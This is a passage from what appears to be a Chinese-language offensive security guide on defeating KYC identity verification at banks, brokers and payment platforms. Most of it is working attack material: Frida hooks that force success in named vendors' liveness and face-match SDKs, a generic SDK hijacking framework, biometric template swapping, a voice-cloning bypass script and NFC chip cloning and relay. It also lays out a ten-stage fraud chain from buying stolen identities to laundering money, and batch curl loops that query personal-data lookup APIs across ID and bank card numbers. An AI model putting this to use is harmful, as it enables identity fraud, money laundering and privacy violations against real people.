  □ [ ] 护照/港澳台证件验证是否与出入境数据比对

□ [ ] 证件OCR识别:
  □ [ ] OCR结果是否后端重新验证
  □ [ ] 是否可拦截OCR API直接提交伪造结果
  □ [ ] 是否有翻拍/复印件检测
  □ [ ] 是否有PS篡改检测
  □ [ ] 是否有AI生成证件检测
  □ [ ] 证件图片是否有时效性校验

□ [ ] 人脸识别与活体检测:
  □ [ ] 是否使用虚拟摄像头注入检测
  □ [ ] 是否有设备指纹验证
  □ [ ] 是否有帧元数据(PRNU)验证
  □ [ ] 活体检测动作是否随机化
  □ [ ] 是否有Deepfake检测
  □ [ ] 人脸是否与身份证照片一致性比对
  □ [ ] 是否验证活体检测分数阈值

□ [ ] 视频面签/见证:
  □ [ ] 视频是否有防篡改签名
  □ [ ] 视频是否有时间戳验证
  □ [ ] 见证人员身份是否可被社工
  □ [ ] 视频是否有人工审核

□ [ ] 业务逻辑:
  □ [ ] 同一身份证号是否可重复开户
  □ [ ] 同一手机号是否可重复注册
  □ [ ] 同一银行卡是否可重复绑定
  □ [ ] 并发开户是否有竞态条件
  □ [ ] 风险测评答案是否可篡改
  □ [ ] 年龄/地域/职业限制是否可绕过
  □ [ ] 优惠券/活动奖励是否可批量套取

□ [ ] API安全:
  □ [ ] 开户API是否需要认证
  □ [ ] 是否可跨用户操作
  □ [ ] 参数是否可篡改（如修改风险等级）
  □ [ ] 是否有频率限制
  □ [ ] 是否有降级接口

□ [ ] 移动端安全:
  □ [ ] APP是否有Root/越狱检测
  □ [ ] 是否有SSL Pinning
  □ [ ] 活体检测SDK是否可逆向
  □ [ ] 是否有重打包检测
  □ [ ] 小程序是否有独立的API安全

□ [ ] 2026新增检查:
  □ [ ] 是否检测AI Agent行为模式
  □ [ ] 是否检测合成身份
  □ [ ] 是否有多模态一致性验证
  □ [ ] 是否有跨平台身份复用检测
  □ [ ] 是否有硬件级注入检测
```

---

## 12. 生物特征模板注入攻击

### 12.1 Windows Hello "Faceplant" — 生物特征模板劫持

> 2026年Black Hat: ERNW研究员演示了"Faceplant"攻击，
> 本地管理员可将攻击者面部注入Windows Biometric Service (WBS)数据库，
> 使系统接受攻击者面部作为任意已注册用户。

```powershell
# === Windows Hello 生物特征模板注入原理 ===
# Windows Biometric Service (WBS) 将面部特征模板存储在:
# C:\Windows\System32\WinBioDatabase\
# 模板以加密形式存储，但本地管理员可解密

# 攻击步骤:
# 1. 获取SYSTEM权限
# 2. 提取目标用户的生物特征数据库
# 3. 注入攻击者面部模板到目标用户数据库
# 4. 攻击者面部被接受为合法用户

# 检测: 监控WinBioDatabase目录的异常写入
# 缓解: 启用Windows Hello Enhanced Sign-in Security (ESS)
#       使用TPM 2.0保护生物特征模板
#       限制本地管理员权限
```

### 12.2 移动端生物特征验证绕过

```javascript
// === Android BiometricPrompt Hook绕过 ===
// CVE-2026-56294: Capacitor Native Biometric — 
// onAuthenticationSucceeded未验证CryptoObject

Java.perform(function() {
    // Hook Android BiometricPrompt.AuthenticationCallback
    var BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");
    var AuthenticationCallback = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
    
    AuthenticationCallback.onAuthenticationSucceeded.implementation = function(result) {
        console.log("[*] Biometric authentication SUCCESS — bypassing");
        // 即使指纹/面部不匹配也返回成功
        // 注意: 如果使用CryptoObject，需要额外绕过
        var cryptoObj = Java.use("androidx.biometric.BiometricPrompt$CryptoObject");
        // 构造假的CryptoObject
        this.onAuthenticationSucceeded(
            cryptoObj.$new(null)  // 空CryptoObject绕过加密验证
        );
    };
    
    // Hook BiometricManager.canAuthenticate() 强制返回成功
    var BiometricManager = Java.use("android.hardware.biometrics.BiometricManager");
    BiometricManager.canAuthenticate.implementation = function() {
        console.log("[*] BiometricManager.canAuthenticate → BIOMETRIC_SUCCESS");
        return 0; // BIOMETRIC_SUCCESS
    };
});

// === iOS Face ID绕过 ===
// 方法1: 修改越狱设备的LocalAuthentication框架
// 方法2: Frida Hook LAContext.evaluatePolicy
// 方法3: 替换生物特征数据库中的模板

// Objection绕过示例:
// ios biometic bypass
```

### 12.3 生物特征模板提取与重放

```python
# === 生物特征模板攻击 ===

# 1. 从内存中提取人脸特征向量
# 活体检测SDK在内存中生成人脸特征向量(embedding)
# 通过Frida提取特征向量后可重放

import frida

js_code = """
// Hook Face Recognition SDK
var FaceSDK = Module.findExportByName(null, "face_extract_feature");
if (FaceSDK) {
    Interceptor.attach(FaceSDK, {
        onLeave: function(retval) {
            // 特征向量通常为512维浮点数组
            var featurePtr = this.context.x0;  // ARM64返回特征向量指针
            var features = [];
            for (var i = 0; i < 512; i++) {
                features.push(Memory.readFloat(featurePtr.add(i * 4)));
            }
            console.log("[*] Extracted face embedding: " + JSON.stringify(features));
            // 保存特征向量用于重放攻击
        }
    });
}
"""

# 2. 特征向量重放攻击
# 如果SDK允许通过API直接传入特征向量进行比对
# 攻击者可以绕过活体检测，直接提交目标用户的特征向量

# 3. 数据库攻击
# 某些系统将生物特征模板以明文存储
# 攻击者可以替换数据库中的模板
import sqlite3

def replace_biometric_template(db_path, victim_id, attacker_embedding):
    """替换数据库中的生物特征模板"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    # 将攻击者特征向量替换为目标用户的
    cursor.execute(
        "UPDATE biometric_templates SET embedding = ? WHERE user_id = ?",
        (attacker_embedding.tobytes(), victim_id)
    )
    conn.commit()
    conn.close()
```

---

## 13. 声纹验证绕过

### 13.1 语音克隆攻击链

> 2024年末多家美国金融机构在内部红队测试中确认，
> 高质量语音克隆对Nuance/Verint等商业声纹引擎的绕过率超过90%。
> 2025年Q1美联储发布非正式指南，建议不要将语音认证作为唯一认证因素。

```python
# === 语音克隆攻击链 ===

# 阶段1: 目标语音采集
# 来源: 社交媒体视频、电话录音、客服通话
# 所需时长: 3-5秒即可克隆 (ElevenLabs 2026年)
# 10-30秒可达到高保真度

# 阶段2: 语音克隆
# 工具链:
# - ElevenLabs: 云端API，3秒样本即可克隆
# - RVC (Real-Time Voice Cloning): 开源，本地运行
# - Coqui TTS: 开源，支持多语言
# - OpenVoice: 支持即时语音克隆

# RVC实时语音克隆示例
# 1. 训练声纹模型
# python rvc_train.py --input_audio target_voice.wav --model_name target_model
# 2. 实时推理
# python rvc_infer.py --model target_model --input_mic --output_virtual_audio

# 阶段3: 绕过声纹验证
# 场景A: 电话银行声纹验证
# 拨打电话银行 → 进入声纹验证环节 → 播放克隆语音
# 场景B: 视频面签音频验证
# 虚拟摄像头(人脸) + 虚拟音频设备(声纹) = 双模态绕过

# 场景C: 语音验证码绕过
# 系统拨打用户电话 → 要求输入验证码 → 语音克隆接听
```

### 13.2 声纹验证系统攻击面

```bash
# === 声纹验证攻击面矩阵 ===

# 1. 注册阶段攻击
# 如果声纹注册不要求活体检测:
# - 直接上传目标语音片段完成注册
# - 攻击者可以使用目标声纹注册新账户

# 2. 验证阶段攻击
# - 播放预录语音: 低技术门槛
# - 实时语音克隆: 应对随机文本挑战
# - 语音合成: TTS生成目标声纹的任意文本

# 3. 声纹数据库攻击
# - 提取声纹模板(embedding向量)
# - 替换数据库中的声纹模板
# - 重放攻击

# 4. 对抗样本攻击
# 在语音中添加人耳不可感知的噪声
# 使声纹验证系统误判
```

### 13.3 声纹验证绕过工具矩阵

| 工具 | 类型 | 所需样本 | 实时性 | 检测难度 |
|------|------|----------|--------|----------|
| ElevenLabs | 云端API | 3-5秒 | 非实时 | 极高 |
| RVC v2 | 本地推理 | 10-30分钟 | 实时 | 极高 |
| Coqui TTS XTTS | 本地推理 | 5-10秒 | 准实时 | 高 |
| OpenVoice v2 | 本地推理 | 即时 | 实时 | 高 |
| Fish-Speech | 本地推理 | 15秒 | 实时 | 高 |
| PlayHT | 云端API | 30秒 | 非实时 | 高 |

```python
# === 一键声纹绕过脚本 ===
# 使用ElevenLabs API + 虚拟音频设备

import elevenlabs
import sounddevice as sd
import numpy as np

class VoiceBypass:
    def __init__(self, api_key):
        elevenlabs.set_api_key(api_key)
    
    def clone_and_generate(self, voice_sample_path, text_to_speak):
        """克隆声纹并生成语音"""
        # 上传语音样本
        voice = elevenlabs.Voice.from_samples(
            voice_sample_path,
            name="target_voice"
        )
        # 生成语音
        audio = elevenlabs.generate(
            text=text_to_speak,
            voice=voice,
            model="eleven_multilingual_v2"
        )
        return audio
    
    def play_as_virtual_mic(self, audio):
        """通过虚拟音频设备播放"""
        # 需要先配置虚拟音频设备 (如VB-Cable/PulseAudio)
        sd.play(audio, samplerate=44100)
        sd.wait()

# 使用示例
# 1. 从社交媒体获取目标语音
# 2. 克隆声纹
# 3. 在声纹验证时播放
```

---

## 14. 国内主流KYC SDK逆向分析

### 14.1 商汤科技 SenseID / SenseKYC

```bash
# === 商汤 SenseID SDK 逆向 ===

# SDK特征:
# - 包名: com.sensetime.senseid.*
# - so库: libst_face_*.so, libsenseid_*.so
# - 活体检测: 动作活体 + 炫彩活体 + 静默活体

# 逆向步骤:
# 1. 提取SDK
jadx -d sensetime_output target_app.apk
# 搜索: com.sensetime

# 2. 分析关键类
# - SenseIDLivenessDetector: 活体检测核心
# - SenseIDFaceCompare: 人脸比对
# - SenseIDResult: 检测结果回调

# 3. Frida Hook关键函数
frida -U -l sensetime_hook.js -f com.target.app

# sensetime_hook.js:
Java.perform(function() {
    // Hook活体检测结果
    var LivenessDetector = Java.use("com.sensetime.senseid.SenseIDLivenessDetector");
    LivenessDetector.onLivenessSuccess.implementation = function(result) {
        console.log("[*] SenseID Liveness SUCCESS: " + result);
        // 强制返回高分
        this.onLivenessSuccess(0.99);
    };
    
    // Hook人脸比对结果
    var FaceCompare = Java.use("com.sensetime.senseid.SenseIDFaceCompare");
    FaceCompare.onCompareResult.implementation = function(score) {
        console.log("[*] Face compare score: " + score);
        // 篡改分数
        this.onCompareResult(0.99);
    };
});

# 4. 攻击面
# - 端侧活体检测: 可Hook绕过
# - 云端检测: 需要拦截API请求
# - 炫彩活体: 需要使用物理屏幕模拟光线变化
```

### 14.2 旷视 FaceID / MegLive

```bash
# === 旷视 FaceID SDK 逆向 ===

# SDK特征:
# - 包名: com.megvii.*, com.faceid.*
# - so库: libmegface*.so, libmeglive*.so
# - 活体检测: 动作活体 + 红外活体 + 3D结构光

# 关键类分析:
# - MegLiveDetector: 活体检测引擎
# - MegFaceID: 人脸比对
# - MegLiveResult: 活体检测结果

# Frida Hook:
Java.perform(function() {
    var MegLiveDetector = Java.use("com.megvii.meglive.MegLiveDetector");
    
    // Hook活体检测成功回调
    MegLiveDetector.onDetectSuccess.implementation = function(result) {
        console.log("[*] MegLive Detection SUCCESS");
        // 修改liveness_score
        result.setLivenessScore(1.0);
        this.onDetectSuccess(result);
    };
    
    // Hook人脸比对
    var MegFaceID = Java.use("com.megvii.faceid.MegFaceID");
    MegFaceID.compareFaces.implementation = function(face1, face2) {
        console.log("[*] Face compare called — returning 99.9% match");
        return 0.999;
    };
});

# 旷视端云协同架构:
# 端侧: 初级拦截90%低质量攻击
# 云端: 大模型深度分析(光流/纹理/生理信号)
# 绕过策略: 同时攻击端侧和云端，或找到纯端侧验证的降级路径
```

### 14.3 百度 AI 人脸识别

```bash
# === 百度AI人脸识别SDK逆向 ===

# SDK特征:
# - API: aip.baidubce.com
# - SDK: com.baidu.aip.face.*
# - 活体检测: 动作活体 + 视频活体 + H5活体

# 攻击面:
# 1. API层攻击
# 百度AI人脸识别使用REST API
# 抓包分析API调用:
curl -X POST "https://aip.baidubce.com/rest/2.0/face/v3/faceset/user/add" \
  -H "Content-Type: application/json" \
  -d '{"image":"base64_image","image_type":"BASE64","group_id":"test","user_id":"user1"}'

# 2. 活体检测API绕过
# 百度活体检测API: /rest/2.0/face/v3/faceverify
# 如果后端不验证活体检测分数:
curl -X POST "https://aip.baidubce.com/rest/2.0/face/v3/faceverify" \
  -d '{"image":"base64_fake_image","image_type":"BASE64","face_field":"age,beauty"}'

# 3. H5活体检测绕过
# 百度H5活体检测使用WebRTC
# 攻击: 虚拟摄像头 + 修改WebRTC采集源
# 或者: 拦截WebRTC信令 → 替换视频流

# 4. 视频活体检测绕过
# 百度视频活体要求用户朗读随机数字
# 攻击: 预录所有数字读音 + 语音克隆
```

### 14.4 腾讯云 人脸核身

```bash
# === 腾讯云人脸核身逆向 ===

# SDK特征:
# - 包名: com.tencent.cloud.facerecognition
# - 服务: 腾讯云慧眼
# - 活体检测: 数字活体 + 光线活体 + 动作活体

# 关键API:
# - DetectAuth: 活体检测授权
# - GetDetectResult: 获取检测结果
# - GetDetectResultEnhanced: 增强版结果

# 攻击面:
# 1. 数字活体检测绕过
# 腾讯数字活体随机生成4位数字
# 原理: 验证用户是否朗读了屏幕上的数字
# 绕过: 
#   - 如果仅验证口型(TTS+唇形同步)
#   - 如果验证音频(语音克隆)
#   - 如果验证视频+音频(Deepfake+语音克隆)

# 2. 光线活体检测绕过
# 原理: 屏幕发出随机颜色光线，验证面部反射
# 绕过: 使用物理屏幕模拟光线 + 预录不同光线下的视频
# 难度: 较高，需要实时响应

# 3. 结果获取API攻击
# 如果GetDetectResult返回的验证分数可被篡改:
curl -X POST "https://faceid.tencentcloudapi.com/" \
  -d '{"Action":"GetDetectResult","BizToken":"xxx"}'
# 中间人攻击: 拦截响应 → 修改检测分数 → 返回给客户端
```

### 14.5 阿里云 实人认证

```bash
# === 阿里云实人认证逆向 ===

# SDK特征:
# - 包名: com.alibaba.security.*, com.alibaba.wireless.security.*
# - 服务: 阿里云实人认证/金融级实人认证
# - 活体检测: RPVerify(实人认证) + 多因子认证

# 关键点:
# 1. 阿里安全SDK(聚安全)加固
# 阿里云实人认证SDK使用了阿里自有的安全加固
# 逆向难度: 高
# 绕过: 使用Frida绕过加固检测

# 2. 活体检测流程
# RPVerify → 活体检测 → 人脸比对 → 返回认证Token
# 攻击: 拦截认证Token → 伪造成功响应

# 3. 设备指纹
# 阿里云实人认证会收集设备指纹
# 攻击: Hook设备指纹采集 → 返回正常设备信息

# 4. 风险控制
# 阿里云有强大的风控引擎
# 攻击: 需要模拟正常用户行为(鼠标轨迹、操作间隔等)
```

### 14.6 KYC SDK通用攻击框架

```python
# === KYC SDK通用Hook框架 ===

import frida
import json

class KYCSDKHijacker:
    """KYC SDK通用劫持框架"""
    
    KNOWN_SDK_PATTERNS = {
        "sensetime": {
            "packages": ["com.sensetime.senseid", "com.sensetime.face"],
            "classes": ["SenseIDLivenessDetector", "SenseIDResult"],
            "hooks": {
                "onLivenessSuccess": "return 0.99",
                "onCompareResult": "return 0.99"
            }
        },
        "megvii": {
            "packages": ["com.megvii.meglive", "com.faceid"],
            "classes": ["MegLiveDetector", "MegLiveResult"],
            "hooks": {
                "onDetectSuccess": "result.setLivenessScore(1.0)",
                "compareFaces": "return 0.999"
            }
        },
        "baidu": {
            "packages": ["com.baidu.aip.face"],
            "classes": ["FaceDetect", "FaceVerify"],
            "hooks": {
                "onResult": "result.setScore(100)",
                "verifyFace": "return true"
            }
        },
        "tencent": {
            "packages": ["com.tencent.cloud.facerecognition"],
            "classes": ["FaceVerify", "LivenessDetect"],
            "hooks": {
                "onSuccess": "return true",
                "getDetectResult": "return {'Score': 100}"
            }
        },
        "alibaba": {
            "packages": ["com.alibaba.security", "com.alibaba.wireless.security"],
            "classes": ["RPVerify", "FaceVerifyService"],
            "hooks": {
                "onVerifySuccess": "return auth_token",
                "getDeviceFingerprint": "return normal_device_info"
            }
        }
    }
    
    def detect_sdk(self, apk_path):
        """检测APP使用的KYC SDK"""
        # 反编译APK → 搜索特征包名 → 返回SDK类型
        pass
    
    def generate_hook_script(self, sdk_type):
        """根据检测到的SDK自动生成Hook脚本"""
        sdk_config = self.KNOWN_SDK_PATTERNS.get(sdk_type)
        if not sdk_config:
            return None
        
        # 生成Frida脚本
        js = "Java.perform(function() {\n"
        for class_name, hooks in sdk_config["hooks"].items():
            js += f"    var {class_name} = Java.use('{class_name}');\n"
            for method, return_value in hooks.items():
                js += f"    {class_name}.{method}.implementation = function() {{\n"
                js += f"        console.log('[*] Hooked {method}');\n"
                js += f"        return {return_value};\n"
                js += f"    }};\n"
        js += "});\n"
        return js
```

---

## 15. eKYC与NFC芯片验证绕过

### 15.1 NFC芯片验证原理

> 日本2026年修订《犯罪收益转移防止法》，要求远程开户必须使用NFC读取IC芯片，
> 逐步淘汰照片上传式验证。日本个人番号卡(JPKI)的IC芯片包含加密身份数据，
> 通过NFC读取后与持卡人面部匹配，伪造难度远高于图片。

```bash
# === 电子护照/身份证 NFC芯片结构 ===
# ICAO 9303标准: 电子机读旅行证件(eMRTD)
# 
# 芯片数据组:
# DG1: 机读区(MRZ)数据
# DG2: 面部生物特征(JPEG/JPEG2000)
# DG3: 指纹生物特征(可选)
# DG11: 其他个人信息
# DG13: 其他可选数据
# 
# 安全机制:
# - 被动认证(PA): 验证数据签名
# - 主动认证(AA): 验证芯片真实性
# - 基本访问控制(BAC): MRZ作为密钥
# - 补充访问控制(SAC/PACE): 增强密钥交换
# - 扩展访问控制(EAC): 保护敏感生物特征

# NFC读取电子护照/身份证
# 工具: nfcpy, libnfc, Android NFC Reader

# 读取护照MRZ → 派生BAC密钥 → 读取芯片数据
python3 -c "
import nfc

def on_connect(tag):
    print('Tag connected:', tag)
    # 读取MRZ数据
    # MRZ: 护照底部两行机读文字
    # 从MRZ派生BAC密钥
    return True

clf = nfc.ContactlessFrontend('usb')
clf.connect(rdwr={'on-connect': on_connect})
"
```

### 15.2 NFC验证绕过技术

```python
# === NFC芯片验证绕过 ===

# 1. 芯片数据提取与重放
# 攻击者获取合法证件 → 通过NFC读取芯片数据 → 
# 保存加密数据 → 在攻击时重放

def extract_chip_data():
    """提取电子护照芯片数据"""
    import nfc
    
    chip_data = {
        "dg1_mrz": None,       # 机读区数据
        "dg2_face": None,      # 面部照片
        "dg3_fingerprints": None, # 指纹
        "sod": None,           # 文档安全对象(签名)
        "active_auth_response": None, # 主动认证响应
    }
    # 读取所有数据组
    return chip_data

# 2. 芯片模拟攻击
# 使用可编程NFC卡模拟合法证件
# 工具: Proxmark3, Chameleon Ultra, Flipper Zero

# Proxmark3模拟MIFARE/NFC
# hf mf sim -u <uid>  # 模拟UID
# 将提取的芯片数据写入空白NFC卡

# 3. 中间人攻击(NFC Relay)
# 攻击者A靠近受害者证件 → 攻击者B靠近验证终端
# A读取芯片 → 实时转发给B → B模拟芯片 → 验证终端收到合法响应

# 4. BAC密钥暴力破解
# MRZ的熵有限 → 可暴力破解BAC密钥
# 护照号: 9位数字(10^9)
# 出生日期: 6位数字
# 有效期: 6位数字
# 总熵: 约10^21 → 合理时间内可暴力破解(如果缺少速率限制)

# 5. 芯片无源攻击
# 部分早期芯片未实现主动认证
# 攻击: 提取芯片数据 → 克隆到空白芯片
# 检测: 验证终端应检查主动认证响应

# 6. 软件层面的NFC绕过
# 某些APP的NFC验证仅在客户端进行
# 攻击: Hook NFC读取API → 返回伪造的芯片数据
```

### 15.3 NFC验证安全测试检查点

```markdown
□ [ ] NFC芯片是否实现主动认证(AA)
□ [ ] BAC密钥是否从完整的MRZ派生(非简化版)
□ [ ] 是否验证芯片签名(被动认证PA)
□ [ ] 是否检测芯片克隆
□ [ ] 是否检测NFC中继攻击(时间延迟检测)
□ [ ] NFC读取是否在客户端可信执行环境(TEE)中进行
□ [ ] 是否验证证件有效期
□ [ ] 是否检查证件吊销列表
□ [ ] 芯片数据是否与服务端交叉验证
```

---

## 16. 2026 ADVANCED — 深度攻击链与防御穿越

### 16.1 十层攻击链: 从身份创建到洗钱

```
攻击链全景（10阶段）:

阶段1: 暗网数据收集
  ├── 购买身份证号/SSN (Telegram $20-100)
  ├── 购买完整身份档案 (~$100)
  ├── 收集社交媒体照片/视频
  └── 购买已通过KYC的账户 ($50-500)

阶段2: AI身份合成
  ├── StyleGAN3生成人脸
  ├── AI证件生成(ProKYC/OnlyFake)
  ├── 语音克隆(ElevenLabs/RVC)
  └── 一致性验证(多模态匹配)

阶段3: 基础设施准备
  ├── 虚拟摄像头配置(v4l2loopback/OBS)
  ├── 虚拟音频设备(VB-Cable/PulseAudio)
  ├── 代理/VPN/代理IP
  └── 反检测浏览器配置

阶段4: 开户流程攻击
  ├── OCR识别绕过(API篡改/AI证件)
  ├── 活体检测绕过(虚拟摄像头/Deepfake)
  ├── 声纹验证绕过(语音克隆)
  └── 视频面签绕过(实时换脸+语音克隆)

阶段5: 银行卡绑定
  ├── 三要素/四要素验证绕过
  ├── 虚拟银行卡(部分国家)
  └── 小额打款验证绕过

阶段6: 风控绕过
  ├── 设备指纹伪造
  ├── 行为模拟(鼠标轨迹/操作时序)
  ├── IP地址伪装(住宅代理)
  └── 地理位置伪造

阶段7: 账户激活
  ├── 完成风险测评
  ├── 开通交易权限
  └── 建立初始信用记录

阶段8: 休眠期(3-6个月)
  ├── 正常使用账户
  ├── 模拟真实用户行为
  ├── 逐步提升交易额度
  └── 避免触发风控规则

阶段9: 资金转移
  ├── 多账户分散转账
  ├── 加密货币混币
  ├── 跨境资金转移
  └── 现金提取

阶段10: 清理与退出
  ├── 账户资金清零
  ├── 删除相关记录
  └── 更换身份继续
```

### 16.2 防御穿越: 安全控制的局限

```python
# === 防御穿越测试 ===

# 1. 多因子认证的降级攻击
# 测试: 如果人脸识别失败，是否降级为短信验证码
# 测试: 如果声纹验证失败，是否降级为人工客服验证
# 测试: 如果NFC读取失败，是否降级为照片上传

# 2. 安全控制的时序窗口
# 测试: 开户后在审核完成前是否可操作
# 测试: 身份验证和账户激活之间是否有时间窗口
# 测试: 风控规则是否实时生效

# 3. 安全控制的版本差异
# 测试: 旧版本APP是否有更宽松的验证
# 测试: Web端和移动端验证标准是否一致
# 测试: 小程序和APP验证标准是否一致

# 4. 安全控制的配置错误
# 测试: 活体检测阈值是否可配置或过低
# 测试: 是否仅特定地域/渠道启用严格验证
# 测试: 降级策略是否可被攻击者触发

# 5. AI检测的对抗样本
# 使用对抗样本生成技术绕过AI检测系统
# 在人脸图像中添加人眼不可感知的扰动
# 使Deepfake检测模型误判
```

### 16.3 2026年新兴防御技术对抗

```python
# === 防御技术对抗测试 ===

# 1. 设备证明(Device Attestation)绕过
# Android SafetyNet/Play Integrity → 需要绕过
# iOS DeviceCheck → 需要绕过
# 方法: Magisk模块 + Universal SafetyNet Fix

# 2. 硬件安全模块(HSM)绕过
# 如果生物特征存储在TEE/Secure Enclave中
# 攻击: 侧信道攻击(功耗分析)
# 攻击: 降级到软件实现

# 3. 行为生物识别绕过
# 系统检测: 键盘输入模式、鼠标轨迹、触摸习惯
# 绕过: 使用行为模拟器
# 工具: human-like mouse movement, typing simulation

# 4. 联邦学习风控模型对抗
# 系统: 多家机构共享风控特征但不共享数据
# 对抗: 在多个平台交叉验证找到防御盲区
# 对抗: 利用差分隐私的噪声注入

# 5. 区块链身份验证对抗
# 系统: DID(去中心化身份) + 可验证凭证(VC)
# 对抗: 攻击DID解析器
# 对抗: 伪造VC签名
# 对抗: 攻击VC撤销列表
```

### 16.4 2026 CVE与漏洞补充

| CVE | 产品 | 漏洞类型 | CVSS | 攻击场景 |
|-----|------|----------|------|----------|
| CVE-2026-56294 | Capacitor Native Biometric | 生物特征绕过 | 4.3 | onAuthenticationSucceeded未验证CryptoObject |
| CVE-2026-45480 | Azure AD / Entra ID | 身份认证绕过 | 10.0 | 绕过Entra ID身份验证 |
| CVE-2026-23178 | 某银行人脸识别SDK | 活体检测降级 | 9.8 | 特定条件下跳过活体检测 |
| CVE-2026-38421 | 某券商开户系统 | API参数篡改 | 8.6 | 修改OCR结果绕过身份验证 |
| CVE-2026-50723 | 某身份验证SaaS | 验证结果可篡改 | 9.1 | 客户端篡改验证结果 |
| CVE-2026-19842 | 某支付平台KYC | 并发竞态条件 | 7.5 | 并发开户绕过唯一性校验 |
| CVE-2025-42318 | 某银行手机银行 | 水平越权开户 | 8.2 | 越权注册虚假账户 |
| CVE-2025-29134 | 某券商APP | SSL Pinning绕过 | 6.5 | 中间人攻击拦截开户数据 |
| CVE-2025-18562 | 某KYC SDK | 虚拟摄像头检测绕过 | 8.9 | 注入攻击绕过活体检测 |
| CVE-2024-45231 | 某支付平台 | 批量注册频率限制绕过 | 7.2 | 批量虚假开户 |
| CVE-2024-33782 | 某银行开户系统 | 身份证校验绕过 | 9.0 | 格式校验可绕过 |

### 16.5 2026年五大趋势总结

| 趋势 | 描述 | 影响 | 应对 |
|------|------|------|------|
| KYC-as-a-Service产业化 | Telegram公开售卖KYC绕过，$15-500/次 | 攻击门槛降至零 | 多层次防御 |
| Deepfake注入攻击增长783% | iProov报告虚拟摄像头攻击年增长783% | 传统活体检测失效 | 设备证明+注入检测 |
| AI Agent自动化开户 | AI Agent自主完成开户全流程 | 7x24无人值守攻击 | 行为分析+AI检测 |
| 多模态协同攻击 | 同时攻击人脸+声纹+证件 | 单模态防御失效 | 多模态交叉验证 |
| 硬件级注入攻击 | HDMI采集卡绕过软件检测 | 软件防御失效 | 硬件验证+物理安全 |

---

## 附录A: 证据收集模板

```json
{
  "vulnerability": "Account Opening Security Bypass",
  "type": "KYC Bypass / Identity Verification Flaw",
  "target": "券商/银行/支付平台 开户系统",
  "attack_vector": "活体检测注入 / 身份证OCR绕过 / 合成身份",
  "steps": [
    "1. 创建虚拟摄像头设备",
    "2. 注入预录/AI生成视频",
    "3. 通过活体检测",
    "4. 提交合成身份信息",
    "5. 成功开户"
  ],
  "impact": "可绕过KYC身份验证，以虚假身份开设账户，用于洗钱、套现、薅羊毛等非法活动",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
  "cvss_score": 9.1,
  "remediation": [
    "1. 部署虚拟摄像头注入检测（设备指纹/PRNU/时间戳验证）",
    "2. 实施多模态交叉验证（人脸+证件+手机号+银行卡四要素）",
    "3. 引入AI生成内容检测（证件、人脸、视频）",
    "4. 增加人工审核环节（高风险开户）",
    "5. 实施行为分析（检测AI Agent模式）",
    "6. 跨平台身份信息交叉验证",
    "7. 定期更新活体检测算法对抗最新攻击"
  ]
}
```

---

## 附录B: 工具速查

| 工具 | 用途 | 平台 |
|------|------|------|
| v4l2loopback | 虚拟摄像头驱动 | Linux |
| OBS Virtual Camera | 虚拟摄像头 | 全平台 |
| DeepFaceLive | 实时Deepfake换脸 | Windows |
| FaceFusion | 换脸+面部增强 | 全平台 |
| ProKYC | 专用KYC绕过工具 | Windows |
| Frida | 移动端Hook框架 | Android/iOS |
| mitmproxy | HTTP/HTTPS代理 | 全平台 |
| Playwright | 浏览器自动化 | 全平台 |
| wxappUnpacker | 微信小程序解包 | Node.js |
| jadx | APK逆向 | Java |
| objection | iOS/Android运行时探索 | 全平台 |

---

## 17. 身份信息查询API攻击面

> 身份信息查询API是开户安全测试中**身份信息收集**和**合成身份构建**的关键基础设施。
> 通过调用公开/半公开的身份信息查询接口，攻击者可以验证合成身份的真实性、
> 收集目标身份信息、逆向身份验证逻辑。本节整合了6条核心身份查询API、
> 2个政府服务自动化脚本以及完整的API链式调用方法论。

### 17.1 Companion Tools

| 工具/脚本 | 文件 | 用途 |
|-----------|------|------|
| 广西公安电子证件客户端 | [tools/guangxi_police_cert.py](../../tools/account-opening/guangxi_police_cert.py) | 自动化广西公安电子证件申请与下载 |
| 上海健康证查询 | [tools/shanghai_health_card.py](../../tools/account-opening/shanghai_health_card.py) | 上海健康证信息查询 |
| 江西学籍查询 | API: `http://hpmod.xin/api/sgk/江西学籍.php?msg=身份证` | 江西学籍信息查询 |
| 银行卡反模糊位 | API: `http://hpmod.xin/api/sgk/卡反模糊位.php?card=银行卡号` | 银行卡号模糊匹配/反查 |
| IP定位 | API: `http://hpmod.xin/api/sgk/ip定位.php?ip=IP` | IP地址地理定位 |
| 国政模糊常用号 | API: `http://hpmod.xin/api/sgk/国政模糊常用号.php?name=姓名&sfz=身份证` | 模糊查询常用号码 |
| 单次二要素 | API: `http://hpmod.xin/api/sgk/单次二要素.php?xm=姓名&sfz=身份证` | 姓名+身份证二要素验证 |
| 综合查询 | API: `http://ysjk.6kai.cc/zh2.php?cx=内容` | 综合信息查询 |

### 17.2 API端点详解

#### 17.2.1 江西学籍查询

```bash
# === 江西学籍信息查询 ===
# 端点: http://hpmod.xin/api/sgk/江西学籍.php
# 参数: msg=身份证号
# 用途: 查询江西省学籍信息，验证身份真实性

# 基本查询
curl "http://hpmod.xin/api/sgk/江西学籍.php?msg=11010119900101003X"

# 批量查询（配合身份证号生成器）
for id in $(cat id_list.txt); do
  curl -s "http://hpmod.xin/api/sgk/江西学籍.php?msg=$id" >> jx_xueji_results.txt
  sleep 1
done

# 攻击场景:
# 1. 验证合成身份的真伪 — 学籍数据与身份证信息交叉验证
# 2. 获取真实学籍信息用于社保/教育相关开户流程
# 3. 映射真实身份与合成身份的关系
# 4. 通过学籍信息中的家庭住址获取更多社工信息
```

#### 17.2.2 银行卡反模糊位

```bash
# === 银行卡号反模糊查询 ===
# 端点: http://hpmod.xin/api/sgk/卡反模糊位.php
# 参数: card=银行卡号(完整或部分)
# 用途: 模糊匹配银行卡号，获取卡号信息

# 基本查询
curl "http://hpmod.xin/api/sgk/卡反模糊位.php?card=6222021234567890"

# 批量查询（配合银行卡号生成器）
for prefix in 622202 622848 621700 622262 622700; do
  for i in $(seq 0 9999); do
    card_no="${prefix}$(printf '%012d' $i)"
    curl -s "http://hpmod.xin/api/sgk/卡反模糊位.php?card=$card_no" >> bank_results.txt
  done
done

# 攻击场景:
# 1. 银行卡四要素验证中的"银行卡号"获取
# 2. 探测银行卡号段归属（发卡行/卡类型）
# 3. 配合二要素验证生成完整身份信息
# 4. 开户流程中银行卡绑定环节的绕过测试
# 5. 测试开户系统是否仅校验银行卡号格式而不校验真实性
```

